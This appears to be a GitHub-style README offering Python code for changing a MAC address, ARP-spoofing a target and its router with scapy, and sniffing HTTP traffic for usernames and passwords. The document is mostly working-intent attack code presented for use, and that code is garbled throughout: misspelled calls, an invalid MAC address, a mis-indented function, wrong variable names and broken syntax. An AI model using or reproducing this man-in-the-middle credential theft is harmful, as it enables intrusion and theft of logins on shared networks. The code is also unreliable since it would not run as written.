# Sniffer-code
for sniffing the code first u need know how to change the mac address and do the ARP spoofing i will be providing the code for both mac address changing and arp spoofing.
MAC ADDRESS CHANGING IN PYTHON
import subprocess
import optparse
def get_arguments():
  parser=optparse.OptionParser()
  parser.add_option("-i", "--interface", dest="interface", help="enter the correct ip address")
  parser.add_option("-m", "--macadress", dest="new_mac", help="enter the correct mac address")
  (options,arguments)=parser.parse_args()
def change_mac(interface,new_mac):
   printf("changing mac address for " + interface + " to " +new_mac)
   subprocess.call(["ifconfig", interface, "down"])
   subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
   subprocess.cal(["ifconfig", interface, "up"])
options=get_arguments()
change_mac(options.interface,options.new_mac)
ARP SPOOFING IN PYTHON
import scapy.all as scapy
def get_mac(ip):
  request=scapy.ARP(pdst=ip)#your are requesting destination ip
  broadcast=scapy.Ether(dst="ff:ff:ff:gg:aa:aa")#after collecting destinatio ip i am setting it into default ip which i need
  request_broadcast=broadcast/request
  answered_list=scapy.srp(request_broadcast, timeout=1, verbose=false)[0]
  answered_list[0][1].hwsrc #users hardware source
  clients_list=[]
  for element in answered_list:
     client_dict={"ip":element[1].psrc, "mac":element[1].psrc}
     client_list.append(client_dict)
  return clients_list
  def spoof(targetip, spoofip):
    packet=scapy.ARP(op=2, pdst=targetip hwdst="00:11:22:33:44:55:66", psrc=spoofip) #here in hwdst field u should give ur destination mac for example i have given that
    scapy.send(packet,verbose=False)
sent_packets_count=0
while true:
   spoof("ur router ip ", "ur ip")
   spoof("ur ip","ur router ip")
   sent_packets_count=0
   print("packets sent: " + str(sent_packets_count), end=" ")
   time.sleep(2)
NOW OUR MAIN CODE SNIFFIER
import scapy.all as scapy
from scapy.layers import http
def sniff(interface):
   scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def get_url(packet):
   return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_info(packet):
   if packet.haslayer(scapy.Raw):
      load=packet[scapy.Raw].load
      keywords=["username", "user", "login", "password", "pass"]
      for keyword in keywords:
         if keyword in load:
             return load
               break
def process_sniffed_packet(packet):
   if packet.haslayer(http.HTTPRequest):
      url = get_url(packet)
      print(" http request" + url)
      login_info=get_login_info(packet)
      if login_info:
         print("\n username and password" + login_info + "\n")
sniff("ur network ") #when u type ifconfig in your linux u will be getting list of networks like eth0, wlan0, l0,.. that are working now u can choose any of them in that and enter in sniff function when your calling the function
/****##$$$^^^ REMAINDER WHEN YOU WANT TO SNIFFING U HAVE TO RUN TO CODES ONE IS ARP SPOOFING AND NEXT ONE IS SNIFFER CODE HOWEVER YOU WILL EXECUTE MAC  ADDRESS CODE ^^^$$$$##****/
